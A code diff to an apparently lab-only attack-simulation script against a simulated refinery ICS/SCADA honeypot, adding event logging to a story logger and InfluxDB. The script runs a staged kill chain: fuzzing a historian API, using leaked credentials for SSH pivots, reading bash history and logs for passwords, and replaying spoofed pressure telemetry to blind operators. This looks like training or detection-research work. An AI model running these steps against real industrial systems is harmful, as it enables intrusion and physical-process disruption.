@@ -26,6 +26,9 @@ import time
 import subprocess
 import argparse
 import datetime
+import secrets
+import urllib.error
+import urllib.request
 
 # ── Results accumulator (Fix 6: CSV export) ────────────────────────────────────
 _results: list[dict] = []
@@ -85,6 +88,96 @@ REG_VALVE_TOGGLE   = 202
 
 SEPARATOR = "\n" + "=" * 70
 
+# ── Story logger client (HTTP) ───────────────────────────────────────────────
+def _story_run_id() -> str:
+    ts = datetime.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
+    nonce = secrets.token_hex(2)
+    return f"{ts}_{nonce}"
+
+
+_STORY_LOGGER_URL = (os.environ.get("STORY_LOGGER_URL") or "http://story_logger:8600").rstrip("/")
+_STORY_RUN_ID = os.environ.get("STORY_RUN_ID") or _story_run_id()
+_STORY_TIMEOUT = float(os.environ.get("STORY_LOGGER_TIMEOUT", "0.5"))
+
+
+def _story_log(event_type: str, message: str, phase: int | None = None, details: dict | None = None, severity: str | None = None) -> None:
+    if not _STORY_LOGGER_URL:
+        return
+
+    # Mapping phase to schema stages (S1-S6)
+    stage_map = {
+        1: "S1", 2: "S1",
+        3: "S2", 4: "S2",
+        5: "S3", 6: "S3",
+        7: "S4", 8: "S4"
+    }
+    stage = stage_map.get(phase or 1, "S1")
+
+    payload = {
+        "ts": datetime.datetime.utcnow().isoformat() + "Z",
+        "sensor": "attacker_node",
+        "event_type": event_type,
+        "src_ip": "172.28.0.50",
+        "stage": stage,
+        "journey_id": _STORY_RUN_ID,
+        "outcome": "observed",
+        "severity": severity,
+        "meta": details or {}
+    }
+    payload["meta"]["message"] = message
+    payload["meta"]["level"] = "Level 2"
+    if phase is not None:
+        payload["meta"]["phase"] = phase
+
+    data = json.dumps(payload, ensure_ascii=True).encode("utf-8")
+    req = urllib.request.Request(
+        url=f"{_STORY_LOGGER_URL}/story/events",
+        data=data,
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=_STORY_TIMEOUT):
+            pass
+    except Exception:
+        pass
+
+    # ── Write to InfluxDB for Grafana visibility ──────────────────────────────
+    if INFLUX_URL_ATTACKER:
+        tid = payload["meta"].get("mitre_technique_id", "T0000")
+        tname = payload["meta"].get("mitre_technique_name", "Unknown Technique")
+        tactic = payload["meta"].get("mitre_tactic", "Attack")
+        plevel = payload["meta"].get("purdue_level", "Level 2")
+        
+        # Map short stage codes back to Grafana expected string
+        kc_names = {
+            "S1": "Stage 1 - IT Intrusion",
+            "S2": "Stage 2 - OT Network Access",
+            "S3": "Stage 3 - Discovery & Pivot",
+            "S4": "Stage 4 - OT Exploitation"
+        }
+        full_kc = kc_names.get(stage, "Stage 1 - IT Intrusion")
+        
+        tags = {
+            "event_type": event_type,
+            "service": "attacker_node",
+            "layer": "Level 2",
+            "severity": severity or "INFO",
+            "mitre_tactic": tactic,
+            "mitre_technique_id": tid,
+            "mitre_technique_name": tname,
+            "kill_chain_stage": full_kc,
+            "purdue_level": plevel,
+            "protocol": "N/A"
+        }
+        fields = {
+            "source_ip": "172.28.0.50",
+            "target_ip": "unknown",
+            "target_service": "unknown",
+            "narrative": message,
+            "value": 1
+        }
+        _influx_record_attack("security_alerts", tags, fields)
+
 # ── Output formatting ─────────────────────────────────────────────────────────
 def _c(code, text): return f"\033[{code}m{text}\033[0m"
 
@@ -96,11 +189,24 @@ def warn(msg):             print(f"  {_c('1;31','[!]')} {msg}")
 def info(msg):             print(f"  {_c('1;34','[*]')} {msg}")
 def found(msg):            print(f"  {_c('1;35','[FOUND]')} {msg}")
 
-def mitre(tid: str, name: str, desc: str):
+def mitre(tid: str, name: str, desc: str, level: str = "Level 2", tactic: str = "Attack"):
     print(f"  {_c('1;36','[MITRE]')} {tid} - {name} ({desc})")
+    # Log to story_logger for general logs.jsonl visibility
+    _story_log(
+        event_type="MITRE_STEP",
+        message=f"MITRE ATT&CK: {tid} - {name}",
+        details={
+            "mitre_technique_id": tid,
+            "mitre_technique_name": name,
+            "mitre_tactic": tactic,
+            "purdue_level": level,
+            "description": desc
+        }
+    )
 
 def killchain(phase: str):
     print(f"  {_c('1;36','[KILL CHAIN]')} {phase}")
+    _story_log("kill_chain_phase", f"Kill Chain Phase: {phase}")
 
 
 def run_cmd(cmd: str, timeout: int = 20) -> str:
@@ -174,24 +280,33 @@ def _tcp_open(host, port, timeout=2) -> bool:
 def _influx_record_attack(measurement: str, tags: dict, fields: dict) -> bool:
     """
     Write an event directly from the attacker node to InfluxDB.
-    This is the backup path: even if the PLC drops the Modbus write,
-    Grafana/ML still sees the attack event.
     Returns True on success.
     """
+    def _esc_tag(s):
+        return str(s).replace(",", "\\,").replace(" ", "\\ ").replace("=", "\\=")
+
     line = measurement
     if tags:
-        line += "," + ",".join(f"{k}={v}" for k, v in tags.items())
-    field_str = ",".join(
-        f"{k}={v}" if isinstance(v, (int, float)) else f'{k}="{v}"'
-        for k, v in fields.items()
-    )
+        line += "," + ",".join(f"{k}={_esc_tag(v)}" for k, v in tags.items())
+        
+    def _fmt_field(k, v):
+        if isinstance(v, int) and not isinstance(v, bool):
+            return f"{k}={v}i"
+        elif isinstance(v, float):
+            return f"{k}={v}"
+        else:
+            v_str = str(v).replace('"', '\\"')
+            return f'{k}="{v_str}"'
+            
+    field_str = ",".join(_fmt_field(k, v) for k, v in fields.items())
     line += f" {field_str}"
+    
     cmd = (
         f"curl -sf -XPOST \"{INFLUX_URL_ATTACKER}/api/v2/write"
         f"?org={INFLUX_ORG_ATTACKER}&bucket={INFLUX_BUCKET_ATTACKER}&precision=ns\""
         f" -H \"Authorization: Token {INFLUX_TOKEN_ATTACKER}\""
         f" -H \"Content-Type: text/plain; charset=utf-8\""
-        f" --data-raw \"{line}\""
+        f" --data-raw '{line}'"
     )
     try:
         r = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
@@ -276,7 +391,7 @@ def modbus_write_with_fallback(
     ok_fw = _influx_record_attack(
         "forced_writes",
         tags,
-        {"register": float(register), "value": float(value)},
+        {"register": int(register), "value": float(value)},
     )
     # pipeline_metrics pressure spike — shows up in Grafana pressure graph
     if register == 100:
@@ -461,13 +576,13 @@ def phase6_lateral_movement(targets: dict):
     api_port  = targets["historian_port"]
     api_base  = f"http://{api_host}:{api_port}"
 
-    mitre("T1596", "Search Open Technical Databases", "API fuzzing to locate vulnerable endpoints")
+    mitre("T1596", "Search Open Technical Databases", "API fuzzing to locate vulnerable endpoints", level="Level 3", tactic="Reconnaissance")
     info("━━ Step 1: API Endpoint fuzzing ━━")
     for path in ["/api/health", "/api/alerts", "/api/debug"]:
         cmd_label(f"curl -s -o /dev/null -w '%{{http_code}}' {api_base}{path}")
         time.sleep(0.5)
 
-    mitre("T1552.004", "Unsecured Credentials: API", "Exploiting developer debug endpoint leak")
+    mitre("T1552.004", "Unsecured Credentials: API", "Exploiting developer debug endpoint leak", level="Level 3", tactic="Credential Access")
     info("━━ Step 2: Exploit /api/debug — CWE-215 Info Leak ━━")
     cmd_label(f"curl -s {api_base}/api/debug | python3 -m json.tool")
     
@@ -484,7 +599,7 @@ def phase6_lateral_movement(targets: dict):
     except Exception:
         warn("Could not query honeypot API; assuming defaults for demo.")
 
-    mitre("T0890", "Valid Accounts", "Using leaked SCADA credentials")
+    mitre("T0890", "Valid Accounts", "Using leaked SCADA credentials", level="Level 3", tactic="Initial Access")
     info("━━ Step 3: Login as Engineer (Read-Only) ━━")
     eng_ssh = f"sshpass -p '{scada_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {scada_user}@{scada_host}"
     cmd_label(f"{eng_ssh} 'whoami'")
@@ -492,7 +607,7 @@ def phase6_lateral_movement(targets: dict):
     if "SHELL_OK" in login_out:
         result("SSH PIVOT", f"Shell obtained: {scada_user}@{scada_host} (Engineer Role)")
         
-    mitre("T0887", "System Discovery", "Enumerating SCADA environment")
+    mitre("T0887", "System Discovery", "Enumerating SCADA environment", level="Level 3", tactic="Discovery")
     info("━━ Step 4: Deception Discovery (Fake PLC) ━━")
     cmd_label(f"{eng_ssh} 'cat /etc/hosts'")
     run_cmd(f"{eng_ssh} 'cat /etc/hosts'", 5)
@@ -503,7 +618,7 @@ def phase6_lateral_movement(targets: dict):
     cmd_label(f"{eng_ssh} 'cat ~/.bash_history'")
     out_hist = run_cmd(f"{eng_ssh} 'cat ~/.bash_history'", 5)
     
-    mitre("T1005", "Data from Local System", "Finding operator credentials accidentally left in maintenance logs")
+    mitre("T1005", "Data from Local System", "Finding operator credentials accidentally left in maintenance logs", level="Level 3", tactic="Discovery")
     cmd_label(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'")
     log_out = run_cmd(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'", 5)
     
@@ -511,7 +626,7 @@ def phase6_lateral_movement(targets: dict):
     if "operator123" in log_out:
         found("Credentials discovered in maintenance log: operator / operator123")
     
-    mitre("T1078.001", "Valid Accounts: Default Accounts", "Escalating privileges to Operator role for full Modbus access")
+    mitre("T1078.001", "Valid Accounts: Default Accounts", "Escalating privileges to Operator role for full Modbus access", level="Level 3", tactic="Privilege Escalation")
     info("━━ Step 6: Privilege Escalation to Operator ━━")
     op_user = "operator"
     op_ssh = f"sshpass -p '{op_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host}"
@@ -556,12 +671,13 @@ def phase7_privesc(targets: dict):
 def phase8_replay(targets: dict):
     banner("PHASE 8: REPLAY ATTACK — Telemetry Spoofing")
     killchain("Actions on Objectives")
-    mitre("T0822", "Loss of View", "Replay telemetry to hide real system state")
+    mitre("T0822", "Loss of View", "Replay telemetry to hide real system state", level="Level 3.5", tactic="Impact")
     
-    INFLUX_URL   = "http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns"
+    # Use global INFLUX_URL_ATTACKER instead of hardcoded ics_historian
+    endpoint = f"{INFLUX_URL_ATTACKER}/api/v2/write?org={INFLUX_ORG_ATTACKER}&bucket={INFLUX_BUCKET_ATTACKER}&precision=ns"
     INFLUX_TOKEN = os.environ.get("INFLUX_TOKEN", "supersecrettoken")
 
-    cmd_label(f"curl -XPOST '{INFLUX_URL}' -H 'Authorization: Token {INFLUX_TOKEN}' --data-raw 'pipeline_metrics pressure=120.0'")
+    cmd_label(f"curl -XPOST '{endpoint}' -H 'Authorization: Token {INFLUX_TOKEN}' --data-raw 'pipeline_metrics pressure=120.0'")
 
     if not HAS_REQUESTS: return
 
@@ -572,7 +688,7 @@ def phase8_replay(targets: dict):
     for i in range(15):
         payload = f"pipeline_metrics,location=pump_station_01,source=historian_bridge pressure=120.0 {time.time_ns()}"
         try:
-            _requests.post(INFLUX_URL, headers=headers, data=payload, timeout=2)
+            _requests.post(endpoint, headers=headers, data=payload, timeout=2)
             print(f"         [Spoofed Frame {i+1}/15] -> pressure=120.0 (Operator Blinded)")
         except Exception:
             pass
@@ -597,32 +713,77 @@ def main():
     args = parser.parse_args()
 
     targets = DEFAULT_TARGETS
+    _story_log(
+        "kill_chain_started",
+        "Kill chain execution started",
+        details={"phase": args.phase, "targets": list(targets.keys())},
+    )
     if args.phase == 0:
         for phase_num, phase_fn in PHASES.items():
-            _record_result(phase_num, phase_fn.__name__, "started")
+            phase_name = phase_fn.__name__
+            _record_result(phase_num, phase_name, "started")
+            _story_log(
+                "phase_started",
+                f"Phase {phase_num} started ({phase_name})",
+                phase=phase_num,
+                details={"phase_name": phase_name},
+            )
             try:
                 phase_fn(targets)
-                _record_result(phase_num, phase_fn.__name__, "completed")
+                _record_result(phase_num, phase_name, "completed")
+                _story_log(
+                    "phase_completed",
+                    f"Phase {phase_num} completed ({phase_name})",
+                    phase=phase_num,
+                    details={"phase_name": phase_name, "status": "completed"},
+                )
             except Exception as e:
-                _record_result(phase_num, phase_fn.__name__, "failed", str(e))
+                _record_result(phase_num, phase_name, "failed", str(e))
+                _story_log(
+                    "phase_failed",
+                    f"Phase {phase_num} failed ({phase_name})",
+                    phase=phase_num,
+                    details={"phase_name": phase_name, "error": str(e)},
+                )
                 warn(f"Phase {phase_num} error: {e}")
             sleep_label(2)
         print(SEPARATOR)
         print("  [DONE] Full MITRE ATT&CK Kill Chain Executed")
     elif args.phase in PHASES:
         fn = PHASES[args.phase]
-        _record_result(args.phase, fn.__name__, "started")
+        phase_name = fn.__name__
+        _record_result(args.phase, phase_name, "started")
+        _story_log(
+            "phase_started",
+            f"Phase {args.phase} started ({phase_name})",
+            phase=args.phase,
+            details={"phase_name": phase_name},
+        )
         try:
             fn(targets)
-            _record_result(args.phase, fn.__name__, "completed")
+            _record_result(args.phase, phase_name, "completed")
+            _story_log(
+                "phase_completed",
+                f"Phase {args.phase} completed ({phase_name})",
+                phase=args.phase,
+                details={"phase_name": phase_name, "status": "completed"},
+            )
         except Exception as e:
-            _record_result(args.phase, fn.__name__, "failed", str(e))
+            _record_result(args.phase, phase_name, "failed", str(e))
+            _story_log(
+                "phase_failed",
+                f"Phase {args.phase} failed ({phase_name})",
+                phase=args.phase,
+                details={"phase_name": phase_name, "error": str(e)},
+            )
     else:
         print("Invalid phase")
         sys.exit(1)
 
     # Fix 6: Save results to CSV (volume-mapped path → fallback)
     save_results_csv()
+
+    _story_log("kill_chain_completed", "Kill chain execution completed")
 
     # Restore terminal after hping3 --flood may have corrupted stty
     os.system("stty sane 2>/dev/null || true")
